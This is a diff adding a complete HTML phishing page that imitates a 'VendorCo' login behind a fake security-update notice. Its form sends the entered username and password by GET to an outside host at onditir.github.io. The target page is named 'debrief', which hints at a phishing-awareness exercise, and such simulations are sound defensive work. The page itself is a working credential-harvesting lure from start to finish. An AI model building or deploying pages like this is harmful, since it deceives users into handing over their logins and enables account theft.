@@ -1,0 +1,20 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>VendorCo Login</title>
+    <style>
+        body { font-family: Arial, sans-serif; text-align: center; margin-top: 50px; }
+        input { padding: 10px; margin: 5px; }
+        button { padding: 10px 20px; background-color: #007BFF; color: white; border: none; }
+    </style>
+</head>
+<body>
+    <h1>VendorCo Security Update</h1>
+    <p>Please enter your credentials to update your account.</p>
+    <form action="https://onditir.github.io/debrief.html" method="GET">
+        <input type="text" placeholder="Username" name="username"><br>
+        <input type="password" placeholder="Password" name="password"><br>
+        <button type="submit">Submit</button>
+    </form>
+</body>
+</html>
